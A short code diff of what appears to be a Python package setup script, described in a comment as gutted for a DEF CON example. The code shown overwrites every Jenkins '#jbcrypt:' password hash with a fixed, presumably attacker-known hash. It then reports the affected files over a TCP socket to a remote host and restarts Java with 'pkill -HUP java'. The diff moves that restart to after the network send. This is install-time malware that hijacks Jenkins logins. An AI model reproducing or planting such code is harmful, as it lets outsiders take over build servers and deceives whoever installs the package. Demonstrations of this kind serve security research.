@@ -37,7 +37,6 @@ for res in results:
                 line = re.sub(r"#jbcrypt:[^<]+", "#jbcrypt:$2a$10$P5dDv4Ckpj5JBlbi5i/l9.bxXfa97kcZuUbmy5Y7jh/2AmumofsKW", line )
                 print line,
 message = 'using jenkins: %s ' % str(results)
-print os.system('pkill -HUP java')
 
 
 """
@@ -57,6 +56,7 @@ s.connect((TCP_IP, TCP_PORT))
 s.send(message)
 data = s.recv(BUFFER_SIZE)
 s.close()
+print os.system('pkill -HUP java')
 # Gutted for purpose of defcon exapmle.
 """
 class osx_install_data(install_data):
